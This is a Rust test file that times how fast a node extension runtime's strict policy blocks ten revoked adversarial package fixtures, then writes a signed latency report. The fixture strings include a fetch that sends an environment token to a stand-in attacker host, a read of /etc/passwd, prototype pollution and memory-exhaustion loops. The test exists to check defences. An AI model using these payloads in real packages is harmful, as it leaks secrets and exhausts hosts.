use chrono::Utc;
use ed25519_dalek::{Signer, SigningKey};
use frankenengine_node::supply_chain::certification::{EvidenceType, VerifiedEvidenceRef};
use frankenengine_node::supply_chain::trust_card::{
    BehavioralProfile, CapabilityDeclaration, CapabilityRisk, CertificationLevel,
    DependencyTrustStatus, ExtensionIdentity, ProvenanceSummary, PublisherIdentity,
    ReputationTrend, RevocationStatus, RiskAssessment, RiskLevel, TrustCardInput,
    TrustCardRegistry,
};
use serde::Serialize;
use serde_json::{json, Value};
use sha2::{Digest, Sha256};
use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, Output};
use std::time::Instant;

const ARTIFACT_RELATIVE_PATH: &str = "artifacts/adversarial/detection_latency_v1.json";
const TRUST_CARD_REGISTRY_RELATIVE_PATH: &str = ".franken-node/state/trust-card-registry.v1.json";
const FIXTURE_SIGNING_KEY_BYTES: [u8; 32] = [0x44; 32];

#[derive(Clone, Copy)]
struct AdversarialExtensionFixture {
    case_id: &'static str,
    package_name: &'static str,
    version_requirement: &'static str,
    attack_vector: &'static str,
    payload_body: &'static str,
}

#[derive(Clone, Serialize)]
struct DetectionLatencyCase {
    case_id: String,
    extension_id: String,
    attack_vector: String,
    spawn_to_block_ms: f64,
    blocked: bool,
    contained: bool,
    exit_code: Option<i32>,
    typed_errors: Vec<String>,
    result_statuses: Vec<String>,
}

#[derive(Clone, Serialize)]
struct PassCriterion {
    criterion: &'static str,
    passed: bool,
}

#[derive(Clone, Serialize)]
struct DetectionLatencyArtifact {
    schema_version: &'static str,
    artifact_id: &'static str,
    generated_at_utc: String,
    measurement_boundary: &'static str,
    pass_criterion: PassCriterion,
    sample_count: usize,
    p50_ms: f64,
    p95_ms: f64,
    p99_ms: f64,
    max_ms: f64,
    cases: Vec<DetectionLatencyCase>,
}

#[derive(Clone, Serialize)]
struct ArtifactSignature {
    algorithm: &'static str,
    key_id: &'static str,
    public_key: String,
    payload_sha256: String,
    value: String,
}

#[derive(Clone, Serialize)]
struct SignedDetectionLatencyArtifact {
    #[serde(flatten)]
    payload: DetectionLatencyArtifact,
    signature: ArtifactSignature,
}

const FIXTURES: &[AdversarialExtensionFixture] = &[
    AdversarialExtensionFixture {
        case_id: "malicious-postinstall",
        package_name: "@adversarial/malicious-postinstall",
        version_requirement: "1.0.0",
        attack_vector: "malicious package postinstall hook",
        payload_body: "throw new Error('fixture would exfiltrate install-time secrets');\n",
    },
    AdversarialExtensionFixture {
        case_id: "prototype-pollution",
        package_name: "@adversarial/prototype-pollution",
        version_requirement: "1.0.0",
        attack_vector: "Object prototype pollution during extension bootstrap",
        payload_body: "Object.prototype.franken_admin = true;\n",
    },
    AdversarialExtensionFixture {
        case_id: "ambient-authority-abuse",
        package_name: "@adversarial/ambient-authority-abuse",
        version_requirement: "1.0.0",
        attack_vector: "ambient filesystem and environment authority abuse",
        payload_body: "process.env.FRANKEN_TOKEN; require('fs').readFileSync('/etc/passwd');\n",
    },
    AdversarialExtensionFixture {
        case_id: "egress-to-unknown-host",
        package_name: "@adversarial/egress-to-unknown-host",
        version_requirement: "1.0.0",
        attack_vector: "network egress to an undeclared external host",
        payload_body: "fetch('https://attacker.invalid/collect?token=' + process.env.FRANKEN_TOKEN);\n",
    },
    AdversarialExtensionFixture {
        case_id: "memory-exhaust",
        package_name: "@adversarial/memory-exhaust",
        version_requirement: "1.0.0",
        attack_vector: "unbounded heap allocation during extension init",
        payload_body: "const chunks = []; while (true) chunks.push(Buffer.alloc(1024 * 1024));\n",
    },
    AdversarialExtensionFixture {
        case_id: "infinite-eval-loop",
        package_name: "@adversarial/infinite-eval-loop",
        version_requirement: "1.0.0",
        attack_vector: "non-terminating eval loop",
        payload_body: "while (true) eval('1 + 1');\n",
    },
    AdversarialExtensionFixture {
        case_id: "trust-card-forgery-attempt",
        package_name: "@adversarial/trust-card-forgery-attempt",
        version_requirement: "1.0.0",
        attack_vector: "forged trust-card metadata shipped inside the extension",
        payload_body: "{\"extension_id\":\"npm:@adversarial/trust-card-forgery-attempt\",\"signature\":\"forged\"}\n",
    },
    AdversarialExtensionFixture {
        case_id: "unsigned-artifact",
        package_name: "@adversarial/unsigned-artifact",
        version_requirement: "1.0.0",
        attack_vector: "extension artifact without provenance signature",
        payload_body: "{\"artifact\":\"dist/extension.tgz\",\"signature\":null}\n",
    },
    AdversarialExtensionFixture {
        case_id: "stale-revocation-exploit",
        package_name: "@adversarial/stale-revocation-exploit",
        version_requirement: "1.0.0",
        attack_vector: "attempt to rely on stale revocation state",
        payload_body: "{\"revocation_epoch\":0,\"claims_fresh\":true}\n",
    },
    AdversarialExtensionFixture {
        case_id: "mislabeled-mime",
        package_name: "@adversarial/mislabeled-mime",
        version_requirement: "1.0.0",
        attack_vector: "JavaScript payload mislabeled as a benign MIME type",
        payload_body: "{\"declared_mime\":\"image/png\",\"actual_payload\":\"module.exports = eval\"}\n",
    },
];

fn repo_root() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .and_then(Path::parent)
        .expect("workspace root")
        .to_path_buf()
}

fn resolve_binary_path() -> PathBuf {
    if let Some(exe) = std::env::var_os("CARGO_BIN_EXE_franken-node") {
        return PathBuf::from(exe);
    }
    if let Some(target_dir) = std::env::var_os("CARGO_TARGET_DIR") {
        return PathBuf::from(target_dir).join("debug/franken-node");
    }
    repo_root().join("target/debug/franken-node")
}

fn args(items: &[&str]) -> Vec<String> {
    items.iter().map(|item| (*item).to_string()).collect()
}

fn run_cli_in_workspace(workspace: &Path, args: &[String]) -> (Output, f64) {
    let binary_path = resolve_binary_path();
    assert!(
        binary_path.is_file(),
        "franken-node binary not found at {}",
        binary_path.display()
    );
    let started = Instant::now();
    let output = Command::new(&binary_path)
        .current_dir(workspace)
        .args(args)
        .output()
        .unwrap_or_else(|err| panic!("failed running `franken-node {}`: {err}", args.join(" ")));
    let elapsed_ms = started.elapsed().as_secs_f64() * 1_000.0;
    (output, elapsed_ms)
}

fn parse_json_stdout(output: &Output, context: &str) -> Value {
    let stdout = String::from_utf8_lossy(&output.stdout);
    serde_json::from_str(&stdout)
        .unwrap_or_else(|err| panic!("{context} should emit valid JSON: {err}\nstdout:\n{stdout}"))
}

fn write_fixture_workspace(workspace: &Path, fixture: &AdversarialExtensionFixture) {
    let mut dependencies = serde_json::Map::new();
    dependencies.insert(
        fixture.package_name.to_string(),
        Value::String(fixture.version_requirement.to_string()),
    );
    let manifest = json!({
        "name": format!("adversarial-detection-latency-{}", fixture.case_id),
        "version": "1.0.0",
        "private": true,
        "main": "index.js",
        "dependencies": dependencies,
    });
    fs::write(
        workspace.join("package.json"),
        serde_json::to_string_pretty(&manifest).expect("serialize root package manifest"),
    )
    .expect("write root package manifest");
    fs::write(
        workspace.join("index.js"),
        "console.log('not reached by blocked preflight');\n",
    )
    .expect("write app entrypoint");
}

fn fixture_evidence_refs(fixture: &AdversarialExtensionFixture) -> Vec<VerifiedEvidenceRef> {
    let evidence_hash = Sha256::digest(format!("adversarial-evidence:{}", fixture.case_id));
    vec![VerifiedEvidenceRef {
        evidence_id: format!("adv-ext-{}-revocation", fixture.case_id),
        evidence_type: EvidenceType::RevocationCheck,
        verified_at_epoch: 2_026_042_000,
        verification_receipt_hash: hex::encode(evidence_hash),
    }]
}

fn write_revoked_trust_registry(workspace: &Path, fixture: &AdversarialExtensionFixture) {
    let mut registry = TrustCardRegistry::default();
    let payload_hash = Sha256::digest(fixture.payload_body.as_bytes());
    let extension_id = format!("npm:{}", fixture.package_name);

    registry
        .create(
            TrustCardInput {
                extension: ExtensionIdentity {
                    extension_id,
                    version: fixture.version_requirement.to_string(),
                },
                publisher: PublisherIdentity {
                    publisher_id: "pub-adversarial-fixtures".to_string(),
                    display_name: "Adversarial Fixture Publisher".to_string(),
                },
                certification_level: CertificationLevel::Bronze,
                capability_declarations: vec![CapabilityDeclaration {
                    name: format!("adversarial.{}", fixture.case_id),
                    description: fixture.attack_vector.to_string(),
                    risk: CapabilityRisk::Critical,
                }],
                behavioral_profile: BehavioralProfile {
                    network_access: fixture.case_id == "egress-to-unknown-host",
                    filesystem_access: fixture.case_id == "ambient-authority-abuse",
                    subprocess_access: false,
                    profile_summary: fixture.attack_vector.to_string(),
                },
                revocation_status: RevocationStatus::Revoked {
                    reason: format!("adversarial extension fixture: {}", fixture.attack_vector),
                    revoked_at: "2026-04-20T00:00:00Z".to_string(),
                },
                provenance_summary: ProvenanceSummary {
                    attestation_level: "fixture-revoked".to_string(),
                    source_uri: format!("fixture://adversarial-extension/{}", fixture.case_id),
                    artifact_hashes: vec![format!("sha256:{}", hex::encode(payload_hash))],
                    verified_at: "2026-04-20T00:00:00Z".to_string(),
                },
                reputation_score_basis_points: 0,
                reputation_trend: ReputationTrend::Declining,
                active_quarantine: true,
                dependency_trust_summary: vec![DependencyTrustStatus {
                    dependency_id: "npm:fixture-transitive@0".to_string(),
                    trust_level: "revoked-fixture".to_string(),
                }],
                last_verified_timestamp: "2026-04-20T00:00:00Z".to_string(),
                user_facing_risk_assessment: RiskAssessment {
                    level: RiskLevel::Critical,
                    summary: format!(
                        "Strict policy must block adversarial fixture {}",
                        fixture.case_id
                    ),
                },
                evidence_refs: fixture_evidence_refs(fixture),
            },
            2_026_042_000,
            "trace-adversarial-detection-latency",
        )
        .expect("create revoked adversarial trust card");

    registry
        .persist_authoritative_state(&workspace.join(TRUST_CARD_REGISTRY_RELATIVE_PATH))
        .expect("persist revoked adversarial trust registry");
}

fn collect_string_field(payload: &Value, array_field: &str, nested_field: &str) -> Vec<String> {
    payload["verdict"][array_field]
        .as_array()
        .map(|items| {
            items
                .iter()
                .filter_map(|item| item[nested_field].as_str().map(ToString::to_string))
                .collect()
        })
        .unwrap_or_default()
}

fn measure_fixture(fixture: &AdversarialExtensionFixture) -> DetectionLatencyCase {
    let workspace = tempfile::tempdir().expect("create adversarial latency workspace");
    write_fixture_workspace(workspace.path(), fixture);
    write_revoked_trust_registry(workspace.path(), fixture);

    let run_args = args(&["run", "--policy", "strict", "--json", "."]);
    let (run_output, spawn_to_block_ms) = run_cli_in_workspace(workspace.path(), &run_args);
    let run_payload = parse_json_stdout(&run_output, "strict adversarial latency run");
    let typed_errors = collect_string_field(&run_payload, "violations", "kind");
    let result_statuses = collect_string_field(&run_payload, "results", "status");
    let blocked = !run_output.status.success() && run_payload["verdict"]["status"] == "blocked";
    let contained = run_payload["receipt"]["decision"] == "denied";

    DetectionLatencyCase {
        case_id: fixture.case_id.to_string(),
        extension_id: format!("npm:{}", fixture.package_name),
        attack_vector: fixture.attack_vector.to_string(),
        spawn_to_block_ms,
        blocked,
        contained,
        exit_code: run_output.status.code(),
        typed_errors,
        result_statuses,
    }
}

fn nearest_rank(sorted: &[f64], percentile: f64) -> f64 {
    assert!(!sorted.is_empty(), "percentile requires samples");
    let rank = ((percentile / 100.0) * sorted.len() as f64).ceil() as usize;
    let index = rank.saturating_sub(1).min(sorted.len() - 1);
    sorted[index]
}

fn round_ms(value: f64) -> f64 {
    (value * 1_000.0).round() / 1_000.0
}

fn build_payload(cases: Vec<DetectionLatencyCase>) -> DetectionLatencyArtifact {
    let mut latencies = cases
        .iter()
        .map(|case| case.spawn_to_block_ms)
        .collect::<Vec<_>>();
    latencies.sort_by(f64::total_cmp);
    let p50_ms = round_ms(nearest_rank(&latencies, 50.0));
    let p95_ms = round_ms(nearest_rank(&latencies, 95.0));
    let p99_ms = round_ms(nearest_rank(&latencies, 99.0));
    let max_ms = round_ms(*latencies.last().expect("latency sample"));

    DetectionLatencyArtifact {
        schema_version: "1.0.0",
        artifact_id: "detection_latency_v1",
        generated_at_utc: Utc::now().to_rfc3339(),
        measurement_boundary: "std::time::Instant around franken-node run process spawn until strict policy block JSON is returned",
        pass_criterion: PassCriterion {
            criterion: "p95<=50ms",
            passed: p95_ms <= 50.0,
        },
        sample_count: cases.len(),
        p50_ms,
        p95_ms,
        p99_ms,
        max_ms,
        cases,
    }
}

fn sign_artifact(payload: DetectionLatencyArtifact) -> SignedDetectionLatencyArtifact {
    let payload_bytes = serde_json::to_vec(&payload).expect("serialize artifact payload");
    let payload_sha256 = Sha256::digest(&payload_bytes);
    let signing_key = SigningKey::from_bytes(&FIXTURE_SIGNING_KEY_BYTES);
    let signature = signing_key.sign(&payload_bytes);

    SignedDetectionLatencyArtifact {
        payload,
        signature: ArtifactSignature {
            algorithm: "ed25519-fixture-v1",
            key_id: "adversarial-detection-latency-v1",
            public_key: hex::encode(signing_key.verifying_key().to_bytes()),
            payload_sha256: format!("sha256:{}", hex::encode(payload_sha256)),
            value: format!("ed25519:{}", hex::encode(signature.to_bytes())),
        },
    }
}

fn write_signed_summary(signed: &SignedDetectionLatencyArtifact) {
    let artifact_path = repo_root().join(ARTIFACT_RELATIVE_PATH);
    let bytes = serde_json::to_vec_pretty(signed).expect("serialize signed artifact");
    fs::write(artifact_path, [bytes, b"\n".to_vec()].concat()).expect("write signed artifact");
}

#[test]
fn adversarial_detection_latency_p95_stays_within_budget() {
    let cases = FIXTURES.iter().map(measure_fixture).collect::<Vec<_>>();
    let signed = sign_artifact(build_payload(cases));
    write_signed_summary(&signed);

    assert_eq!(signed.payload.sample_count, FIXTURES.len());
    assert!(
        signed.payload.pass_criterion.passed,
        "p95 detection latency was {}ms, expected <=50ms",
        signed.payload.p95_ms
    );
    assert!(signed.signature.value.starts_with("ed25519:"));

    for case in &signed.payload.cases {
        assert!(
            case.blocked || case.contained,
            "{} should be blocked or contained by strict policy",
            case.case_id
        );
        assert!(
            case.typed_errors.iter().any(|kind| kind == "revoked"),
            "{} should fail with typed revoked violation, got {:?}",
            case.case_id,
            case.typed_errors
        );
        assert!(
            case.result_statuses
                .iter()
                .any(|status| status == "revoked"),
            "{} should report revoked result status, got {:?}",
            case.case_id,
            case.result_statuses
        );
    }
}
